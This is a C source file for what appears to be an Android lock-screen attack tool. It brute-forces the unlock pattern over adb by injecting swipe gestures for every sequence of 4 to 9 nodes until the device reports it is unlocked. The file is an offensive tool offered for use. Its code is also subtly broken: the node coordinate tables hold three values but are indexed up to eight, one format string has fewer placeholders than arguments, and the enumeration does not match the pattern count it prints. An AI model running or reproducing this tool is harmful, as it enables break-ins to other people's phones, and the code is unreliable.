#define _GNU_SOURCE
#include "pattern_unlock.h"
#include "adb.h"
#include "util.h"
#include <stdio.h>
#include <string.h>
#include <unistd.h>

#define PATTERN_NODES 9

static const int node_x[9] = { 200, 540, 880 };
static const int node_y[9] = { 600, 960, 1320 };

static void pattern_swipe_seq(const int *seq, int len, int w, int h) {
    if (len < 2) return;
    int x1 = node_x[seq[0]] * w / 1080;
    int y1 = node_y[seq[0]] * h / 2400;
    adb_shell_noret("adb shell input swipe %d %d", x1, y1, x1, y1);
    usleep(100000);
    for (int i = 1; i < len; i++) {
        int x2 = node_x[seq[i]] * w / 1080;
        int y2 = node_y[seq[i]] * h / 2400;
        adb_shell_noret("adb shell input swipe %d %d %d %d 50",
                        x1, y1, x2, y2);
        usleep(50000);
        x1 = x2; y1 = y2;
    }
    usleep(300000);
}

static int seq_count = 0;

static void gen_seqs(int *cur, int used, int len, int max_len,
                     int delay_ms, int w, int h) {
    if (!adb_is_unlocked() && len >= 4) {
        pattern_swipe_seq(cur, len, w, h);
        usleep(delay_ms * 1000);
        seq_count++;
        if (seq_count % 100 == 0) {
            printf("\r[*] Patterns tried: %d", seq_count);
            fflush(stdout);
        }
    }
    if (len >= max_len) return;
    for (int i = 0; i < PATTERN_NODES; i++) {
        if (!(used & (1 << i))) {
            cur[len] = i;
            gen_seqs(cur, used | (1 << i), len + 1, max_len, delay_ms, w, h);
            if (adb_is_unlocked()) return;
        }
    }
}

int pattern_brute(int delay_ms) {
    printf("\n" BOLD "=== Pattern Unlock Brute Force ===" RESET "\n");
    printf("[*] Warning: up to 389,112 patterns (length 4-9)\n");
    printf("[*] This may take a very long time.\n");

    int w = adb_get_screen_w();
    int h = adb_get_screen_h();
    printf("[*] Screen: %dx%d\n", w, h);
    printf("[*] Starting pattern brute...\n");

    adb_screen_on();
    usleep(300000);
    adb_swipe_smart();
    usleep(300000);

    seq_count = 0;
    int cur[9];
    gen_seqs(cur, 0, 0, 9, delay_ms, w, h);
    printf("\n");

    if (adb_is_unlocked()) {
        printf(GREEN "[!!!] DEVICE UNLOCKED VIA PATTERN!" RESET "\n");
        return 1;
    }
    printf(YELLOW "[-] Pattern not found." RESET "\n");
    return 0;
}
